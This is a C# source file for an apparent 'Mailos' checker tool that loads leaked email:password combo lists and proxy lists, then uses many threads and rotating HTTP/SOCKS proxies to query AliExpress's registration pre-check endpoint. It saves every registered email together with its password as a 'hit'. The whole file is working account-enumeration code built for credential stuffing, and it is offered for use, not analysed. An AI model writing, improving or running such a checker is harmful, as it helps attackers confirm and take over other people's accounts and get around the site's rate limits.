using JawBrute;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Template;

namespace Ebay_Checker
{
    class AliVM
    {
        [STAThread]
        public static void alivmi()
        {
            Prsc.checkali();
            Export.Initialize();
            Console.Title = "Mailos | AliexpressVM";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                Threads:", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            try
            {
                Variables.threads = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error Parsing Integor...");
                goto fuck;
            }
        fuckme:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [1] HTTP", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [2] SOCKS4", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [3] SOCKS5", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("          > ", Color.SpringGreen);
            string c = Console.ReadLine();
            if (c == "1")
            {
                Variables.proxyprotocol = "HTTP";
            }
            else if (c == "2")
            {
                Variables.proxyprotocol = "SOCKS4";
            }
            else if (c == "3")
            {
                Variables.proxyprotocol = "SOCKS5";
            }
            else
            {
                goto fuckme;
            }
            loadCombos();
        }
        public static void loadCombos()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Combos";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.combos = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.combototal++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            loadProxies();
        }
        public static void loadProxies()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Proxies";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.proxies1 = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.proxytotal++;
                            }

                        }
                    }
                }
            }
            catch
            {

            }
            startali();
        }
        public static void startali()
        {
            Console.Clear();
            ASCII.ASCIII();
            try
            {

                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        Variables.cpm = Variables.cpm_aux;
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - Aliexpress VM] | Registered: " + Variables.hit + " | Invalid: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });

                for (int i = 1; i <= Variables.threads; i++)
                {
                    new Thread(new ThreadStart(CheckAli)).Start();
                }
            }
            catch
            {

            }
        }
        public static void CheckAli()
        {
        stat:
            for (; ; )
            {

                while (true)
                {
                    //RANDOM PROXY EVERY REQ
                    string proxy = "";
                    Random r = new Random();
                    proxy = Variables.proxies1[r.Next(Variables.proxies1.Count)];

                    try
                    {

                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            //SPLITTIN COMBOS
                            if (Variables.comboindex >= Variables.combos.Count<string>())
                            {
                                break;
                            }
                            Interlocked.Increment(ref Variables.comboindex);
                            string[] s = Variables.combos[Variables.comboindex].Split(new char[]
                            {
                            ':'
                            });
                            //s[0] - Email  | s[1] - Password
                            try
                            {
                                //PROXY HANDEL
                                if (Variables.proxyprotocol == "HTTP")
                                {
                                    httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS4")
                                {
                                    httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS5")
                                {
                                    httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                }
                                //REQUESTS - YOU CAN REPLACE WITH COMPILER CODE HERE, USE UR BRAIN PLEASE THANKS`
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                                httpRequest.AddHeader("Pragma", "no-cache");
                                httpRequest.AddHeader("Accept", "*/*");

                                var res0 = httpRequest.Get("https://login.aliexpress.com/join/preCheckForRegister.htm?registerFrom=AE_MAIN_POPUP_WHOLESALE&umidToken=TF8667EB6100A86A003D1394117BC098531BE493439628104133F08A610&ua=121%23%2FYnlk%2Fa66JQlVlhdG8AelLTlA0fNT33VOnraqEg2vw7DKxJnEEpSlhyY8psdK5jVllKY%2BzPIDMlSAQOZZLQPll9YAcWZKujVVyeH4FJ5KM9lOlrJEGiIlMLYAcfdK5jVlmuY%2BapIxM9VO3rnEkDIll9YOc8dKkjVlwgZZgz4XluVS0bvsbc9MtFPe6GG62ibYnsshu%2FmCjVDkeILF9K0bZs0JnCVMZujhLzT83%2Fybbi0CNk1INn0lPi0n6XSp2D0kZ748u%2FmCbibCeIaFtWbbZrDnnx9pCibCZ0T83BhC6ibBZRXB9hWMZecnzgmunYsUueNIG%2Fm7%2FibvehuddcVC6ibn5u9lfAHASYrvd0P1hdYMiBzHDlG1xhSAXe2Dp5YLO7aWyVA%2BDZKhnH1NiATHbEtUNISsaxdYZ9JlCSwwX5pMXwc8lSgokSUKkFgeP1eO1B8mXC2MYwSfvzuZ%2FvPVHwANcTEnu3J9F2wjA2%2FSdncze%2B72x4i56LOdJqyOCgEhs4TtfNNLb0zTryXyyaDcmdDeaRtp6fmiuYnh8kAdtewMVr9ngS9QM0udY13dLJgrnu6FkyC2i2lYQ9hGC5xcJ72YIp8OUNcwzQulMbnIDxmTB8XLh8LedQCmyaxpiVCVzWAVAWziRGif4CKGP4wE5AowYwdYMnOUF0Sg2QTOBvyuGCCJxkdozXdCPpIJQfQOwq13VkWq8OxJ9X9OqtPv4iq3S%2FpUTxs6p9z7qpN0fEUVBpfZwZqgdX0vdo8z0gW1bgXtszPBMdT7YaQoTtLAVqoQ899JeNmu7LN6yPaClZUkeojQ7DFzKlWratog0OIPp31Erenh%2BofLciibLpzqPzHnb8ulHCZhYBDDobTeeM2aHejvSs7SEWQTIzcwH0dwN5pFU1Uvg1NtW6d8mXeAWroHIiNvKeqRWc76A%2BbSu7nL0CFIZKezWp5hFZa6cT13T6WJ%2FkgHzGtSYO%2B80Z4D6omU%2FAByCPOlsotsO269hynZscAXTgD4wt9fz2Ge%2BAMy3lGRP9GnONcP0Zac5J%2BDA9JD0gkOo%2FYCBngFPJhRDKEzcXngKhvb7HQWZU3mDAJ3U7DP7TQujUgBclZ6%2B3d%2BVQO3DUs1CPOpfljgMRHYgOjp2fdca63StbJ1ciUc4UvLzc0jrKYFl2wjv4amBWosw%3D%3D&email=" + s[0] + "");
                                string text0 = res0.ToString();

                                if (text0.Contains("isEmailExisted\":true"))
                                {
                                    Variables.hit++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                    Colorful.Console.WriteLine("               [Registered] " + s[0] + ":" + s[1], Color.Green);
                                    Export.AsResult("/hit", s[0] + ":" + s[1]);
                                }
                                else if (text0.Contains("isEmailExisted\":false"))
                                {
                                    Variables.bad++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                    break;
                                }
                                else
                                {
                                    break;//add retry here
                                }





                                {
                                    goto stat;
                                }
                            }
                            catch (Exception ex)
                            {
                                Variables.error++;

                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Variables.error++;
                    }
                }
            }
        }
    }
}